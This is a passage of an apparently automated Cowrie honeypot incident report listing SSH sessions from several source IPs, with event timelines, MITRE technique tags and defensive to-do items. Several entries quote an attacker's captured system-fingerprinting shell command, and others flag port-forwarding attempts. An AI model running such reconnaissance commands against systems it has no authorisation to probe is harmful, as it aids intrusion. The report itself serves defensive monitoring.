| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:11:50` | `cowrie.session.connect` |
| `2026-08-01 14:11:50` | `cowrie.client.version` |
| `2026-08-01 14:11:50` | `cowrie.client.kex` |
| `2026-08-01 14:11:51` | `cowrie.login.success` |
| `2026-08-01 14:11:52` | `cowrie.session.params` |
| `2026-08-01 14:11:52` | `cowrie.command.input` |
| `2026-08-01 14:11:52` | `cowrie.command.input` |
| `2026-08-01 14:11:52` | `cowrie.command.input` |
| `2026-08-01 14:11:52` | `cowrie.command.input` |
| `2026-08-01 14:11:52` | `cowrie.command.input` |
| `2026-08-01 14:11:52` | `cowrie.command.success` |
| `2026-08-01 14:11:52` | `cowrie.command.input` |
| `2026-08-01 14:11:52` | `cowrie.command.input` |
| `2026-08-01 14:11:52` | `cowrie.command.input` |
| `2026-08-01 14:11:52` | `cowrie.command.input` |
| `2026-08-01 14:11:52` | `cowrie.log.closed` |
| `2026-08-01 14:11:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-676ff8fdba88

| Field | Detail |
|---|---|
| **Source IP** | `116.110.144[.]94` |
| **First Seen** | 2026-08-01 14:12 |
| **Last Seen** | 2026-08-01 14:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:12:00` | `cowrie.session.connect` |
| `2026-08-01 14:12:00` | `cowrie.client.version` |
| `2026-08-01 14:12:00` | `cowrie.client.kex` |
| `2026-08-01 14:12:02` | `cowrie.login.success` |
| `2026-08-01 14:12:03` | `cowrie.direct-tcpip.request` |
| `2026-08-01 14:12:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 14:12:03` | `cowrie.direct-tcpip.data` |
| `2026-08-01 14:12:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.144[.]94` to AbuseIPDB if not already reported
- [ ] Block `116.110.144[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25ab4e01613a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 14:13 |
| **Last Seen** | 2026-08-01 14:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:13:29` | `cowrie.session.connect` |
| `2026-08-01 14:13:29` | `cowrie.client.version` |
| `2026-08-01 14:13:29` | `cowrie.client.kex` |
| `2026-08-01 14:13:29` | `cowrie.login.success` |
| `2026-08-01 14:13:31` | `cowrie.session.params` |
| `2026-08-01 14:13:31` | `cowrie.command.input` |
| `2026-08-01 14:13:31` | `cowrie.command.input` |
| `2026-08-01 14:13:31` | `cowrie.command.input` |
| `2026-08-01 14:13:31` | `cowrie.command.input` |
| `2026-08-01 14:13:31` | `cowrie.command.input` |
| `2026-08-01 14:13:31` | `cowrie.command.success` |
| `2026-08-01 14:13:31` | `cowrie.command.input` |
| `2026-08-01 14:13:31` | `cowrie.command.input` |
| `2026-08-01 14:13:31` | `cowrie.command.input` |
| `2026-08-01 14:13:31` | `cowrie.command.input` |
| `2026-08-01 14:13:31` | `cowrie.log.closed` |
| `2026-08-01 14:13:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59a2352e9803

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 14:15 |
| **Last Seen** | 2026-08-01 14:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:15:07` | `cowrie.session.connect` |
| `2026-08-01 14:15:07` | `cowrie.client.version` |
| `2026-08-01 14:15:07` | `cowrie.client.kex` |
| `2026-08-01 14:15:08` | `cowrie.login.success` |
| `2026-08-01 14:15:09` | `cowrie.session.params` |
| `2026-08-01 14:15:09` | `cowrie.command.input` |
| `2026-08-01 14:15:09` | `cowrie.command.input` |
| `2026-08-01 14:15:09` | `cowrie.command.input` |
| `2026-08-01 14:15:09` | `cowrie.command.input` |
| `2026-08-01 14:15:09` | `cowrie.command.input` |
| `2026-08-01 14:15:09` | `cowrie.command.success` |
| `2026-08-01 14:15:09` | `cowrie.command.input` |
| `2026-08-01 14:15:09` | `cowrie.command.input` |
| `2026-08-01 14:15:09` | `cowrie.command.input` |
| `2026-08-01 14:15:09` | `cowrie.command.input` |
| `2026-08-01 14:15:09` | `cowrie.log.closed` |
| `2026-08-01 14:15:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9b81ec76aea

| Field | Detail |
|---|---|
| **Source IP** | `116.110.151[.]49` |
| **First Seen** | 2026-08-01 14:15 |
| **Last Seen** | 2026-08-01 14:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:15:15` | `cowrie.session.connect` |
| `2026-08-01 14:15:15` | `cowrie.client.version` |
| `2026-08-01 14:15:17` | `cowrie.client.kex` |
| `2026-08-01 14:15:21` | `cowrie.login.success` |
| `2026-08-01 14:15:22` | `cowrie.direct-tcpip.request` |
| `2026-08-01 14:15:22` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 14:15:22` | `cowrie.direct-tcpip.data` |
| `2026-08-01 14:15:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `116.110.151[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19e20d37de1c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 14:16 |
| **Last Seen** | 2026-08-01 14:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:16:43` | `cowrie.session.connect` |
| `2026-08-01 14:16:43` | `cowrie.client.version` |
| `2026-08-01 14:16:43` | `cowrie.client.kex` |
| `2026-08-01 14:16:45` | `cowrie.login.success` |
| `2026-08-01 14:16:46` | `cowrie.session.params` |
| `2026-08-01 14:16:46` | `cowrie.command.input` |
| `2026-08-01 14:16:46` | `cowrie.command.input` |
| `2026-08-01 14:16:46` | `cowrie.command.input` |
| `2026-08-01 14:16:46` | `cowrie.command.input` |
| `2026-08-01 14:16:46` | `cowrie.command.input` |
| `2026-08-01 14:16:46` | `cowrie.command.success` |
| `2026-08-01 14:16:46` | `cowrie.command.input` |
| `2026-08-01 14:16:46` | `cowrie.command.input` |
| `2026-08-01 14:16:46` | `cowrie.command.input` |
| `2026-08-01 14:16:46` | `cowrie.command.input` |
| `2026-08-01 14:16:46` | `cowrie.log.closed` |
| `2026-08-01 14:16:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e6ba61dea43

| Field | Detail |
|---|---|
| **Source IP** | `182.73.164[.]228` |
| **First Seen** | 2026-08-01 14:16 |
| **Last Seen** | 2026-08-01 14:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:16:56` | `cowrie.session.connect` |
| `2026-08-01 14:16:57` | `cowrie.client.version` |
| `2026-08-01 14:16:57` | `cowrie.client.kex` |
| `2026-08-01 14:17:00` | `cowrie.login.success` |
| `2026-08-01 14:17:01` | `cowrie.direct-tcpip.request` |
| `2026-08-01 14:17:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.73.164[.]228` to AbuseIPDB if not already reported
- [ ] Block `182.73.164[.]228` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20238c802139

| Field | Detail |
|---|---|
| **Source IP** | `85.152.57[.]60` |
| **First Seen** | 2026-08-01 14:17 |
| **Last Seen** | 2026-08-01 14:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:17:10` | `cowrie.session.connect` |
| `2026-08-01 14:17:10` | `cowrie.client.version` |
| `2026-08-01 14:17:10` | `cowrie.client.kex` |
| `2026-08-01 14:17:11` | `cowrie.login.success` |
| `2026-08-01 14:17:12` | `cowrie.direct-tcpip.request` |
| `2026-08-01 14:17:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.152.57[.]60` to AbuseIPDB if not already reported
- [ ] Block `85.152.57[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-211de763c2df

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 14:18 |
| **Last Seen** | 2026-08-01 14:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:18:19` | `cowrie.session.connect` |
| `2026-08-01 14:18:19` | `cowrie.client.version` |
| `2026-08-01 14:18:19` | `cowrie.client.kex` |
| `2026-08-01 14:18:20` | `cowrie.login.success` |
| `2026-08-01 14:18:21` | `cowrie.session.params` |
| `2026-08-01 14:18:21` | `cowrie.command.input` |
| `2026-08-01 14:18:21` | `cowrie.command.input` |
| `2026-08-01 14:18:21` | `cowrie.command.input` |
| `2026-08-01 14:18:21` | `cowrie.command.input` |
| `2026-08-01 14:18:21` | `cowrie.command.input` |
| `2026-08-01 14:18:21` | `cowrie.command.success` |
| `2026-08-01 14:18:21` | `cowrie.command.input` |
| `2026-08-01 14:18:21` | `cowrie.command.input` |
| `2026-08-01 14:18:21` | `cowrie.command.input` |
| `2026-08-01 14:18:21` | `cowrie.command.input` |
| `2026-08-01 14:18:21` | `cowrie.log.closed` |
| `2026-08-01 14:18:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d099df422f92

| Field | Detail |
|---|---|
| **Source IP** | `116.110.151[.]49` |
| **First Seen** | 2026-08-01 14:18 |
| **Last Seen** | 2026-08-01 14:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:18:31` | `cowrie.session.connect` |
| `2026-08-01 14:18:31` | `cowrie.client.version` |
| `2026-08-01 14:18:32` | `cowrie.client.kex` |
| `2026-08-01 14:18:37` | `cowrie.login.success` |
| `2026-08-01 14:18:38` | `cowrie.direct-tcpip.request` |
| `2026-08-01 14:18:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 14:18:39` | `cowrie.direct-tcpip.data` |
| `2026-08-01 14:18:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `116.110.151[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43f6e2afe323

| Field | Detail |
|---|---|
| **Source IP** | `116.110.144[.]94` |
| **First Seen** | 2026-08-01 14:19 |
| **Last Seen** | 2026-08-01 14:20 |
| **Session Duration** | 67s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:19:42` | `cowrie.session.connect` |
| `2026-08-01 14:19:43` | `cowrie.client.version` |
| `2026-08-01 14:20:12` | `cowrie.client.kex` |
| `2026-08-01 14:20:14` | `cowrie.login.success` |
| `2026-08-01 14:20:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.144[.]94` to AbuseIPDB if not already reported
- [ ] Block `116.110.144[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea22f1a5ff0f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 14:19 |
| **Last Seen** | 2026-08-01 14:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:19:56` | `cowrie.session.connect` |
| `2026-08-01 14:19:56` | `cowrie.client.version` |
| `2026-08-01 14:19:56` | `cowrie.client.kex` |
| `2026-08-01 14:19:57` | `cowrie.login.success` |
| `2026-08-01 14:19:58` | `cowrie.session.params` |
| `2026-08-01 14:19:58` | `cowrie.command.input` |
| `2026-08-01 14:19:58` | `cowrie.command.input` |
| `2026-08-01 14:19:58` | `cowrie.command.input` |
| `2026-08-01 14:19:58` | `cowrie.command.input` |
| `2026-08-01 14:19:58` | `cowrie.command.input` |
| `2026-08-01 14:19:58` | `cowrie.command.success` |
| `2026-08-01 14:19:58` | `cowrie.command.input` |
| `2026-08-01 14:19:58` | `cowrie.command.input` |
| `2026-08-01 14:19:58` | `cowrie.command.input` |
| `2026-08-01 14:19:58` | `cowrie.command.input` |
| `2026-08-01 14:19:59` | `cowrie.log.closed` |
| `2026-08-01 14:19:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b743c7b182ad

| Field | Detail |
|---|---|
| **Source IP** | `78.186.54[.]65` |
| **First Seen** | 2026-08-01 14:20 |
| **Last Seen** | 2026-08-01 14:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:20:07` | `cowrie.session.connect` |
| `2026-08-01 14:20:07` | `cowrie.client.version` |
| `2026-08-01 14:20:07` | `cowrie.client.kex` |
| `2026-08-01 14:20:09` | `cowrie.login.success` |
| `2026-08-01 14:20:09` | `cowrie.direct-tcpip.request` |
| `2026-08-01 14:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.186.54[.]65` to AbuseIPDB if not already reported
- [ ] Block `78.186.54[.]65` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d5603d090bf

| Field | Detail |
|---|---|
| **Source IP** | `203.198.173[.]137` |
| **First Seen** | 2026-08-01 14:20 |
| **Last Seen** | 2026-08-01 14:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:20:15` | `cowrie.session.connect` |
| `2026-08-01 14:20:15` | `cowrie.client.version` |
| `2026-08-01 14:20:15` | `cowrie.client.kex` |
| `2026-08-01 14:20:17` | `cowrie.login.success` |
| `2026-08-01 14:20:18` | `cowrie.direct-tcpip.request` |
| `2026-08-01 14:20:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.198.173[.]137` to AbuseIPDB if not already reported
- [ ] Block `203.198.173[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c972fcc1732a

| Field | Detail |
|---|---|
| **Source IP** | `116.110.144[.]94` |
| **First Seen** | 2026-08-01 14:20 |
| **Last Seen** | 2026-08-01 14:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:20:59` | `cowrie.session.connect` |
| `2026-08-01 14:20:59` | `cowrie.client.version` |
| `2026-08-01 14:20:59` | `cowrie.client.kex` |
| `2026-08-01 14:21:00` | `cowrie.login.success` |
| `2026-08-01 14:21:00` | `cowrie.direct-tcpip.request` |
| `2026-08-01 14:21:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 14:21:00` | `cowrie.direct-tcpip.data` |
| `2026-08-01 14:21:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.144[.]94` to AbuseIPDB if not already reported
- [ ] Block `116.110.144[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d7d2255dfdf

| Field | Detail |
|---|---|
| **Source IP** | `116.110.151[.]49` |
| **First Seen** | 2026-08-01 14:23 |
| **Last Seen** | 2026-08-01 14:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:23:54` | `cowrie.session.connect` |
| `2026-08-01 14:23:54` | `cowrie.client.version` |
| `2026-08-01 14:23:54` | `cowrie.client.kex` |
| `2026-08-01 14:23:55` | `cowrie.login.success` |
| `2026-08-01 14:23:56` | `cowrie.direct-tcpip.request` |
| `2026-08-01 14:23:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 14:23:56` | `cowrie.direct-tcpip.data` |
| `2026-08-01 14:23:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `116.110.151[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-940103ecce1b

| Field | Detail |
|---|---|
| **Source IP** | `46.48.134[.]131` |
| **First Seen** | 2026-08-01 14:27 |
| **Last Seen** | 2026-08-01 14:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:27:05` | `cowrie.session.connect` |
| `2026-08-01 14:27:07` | `cowrie.client.version` |
| `2026-08-01 14:27:07` | `cowrie.client.kex` |
| `2026-08-01 14:27:08` | `cowrie.login.success` |
| `2026-08-01 14:27:09` | `cowrie.direct-tcpip.request` |
| `2026-08-01 14:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.48.134[.]131` to AbuseIPDB if not already reported
- [ ] Block `46.48.134[.]131` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64dd60e34da8

| Field | Detail |
|---|---|
| **Source IP** | `20.227.140[.]178` |
| **First Seen** | 2026-08-01 14:34 |
| **Last Seen** | 2026-08-01 14:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:34:05` | `cowrie.session.connect` |
| `2026-08-01 14:34:05` | `cowrie.client.version` |
| `2026-08-01 14:34:05` | `cowrie.client.kex` |
| `2026-08-01 14:34:06` | `cowrie.login.success` |
| `2026-08-01 14:34:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.227.140[.]178` to AbuseIPDB if not already reported
- [ ] Block `20.227.140[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e4e030394c5

| Field | Detail |
|---|---|
| **Source IP** | `218.15.224[.]102` |
| **First Seen** | 2026-08-01 14:35 |
| **Last Seen** | 2026-08-01 14:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:35:26` | `cowrie.session.connect` |
| `2026-08-01 14:35:28` | `cowrie.client.version` |
| `2026-08-01 14:35:28` | `cowrie.client.kex` |
| `2026-08-01 14:35:30` | `cowrie.login.success` |
| `2026-08-01 14:35:31` | `cowrie.direct-tcpip.request` |
| `2026-08-01 14:35:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.15.224[.]102` to AbuseIPDB if not already reported
- [ ] Block `218.15.224[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
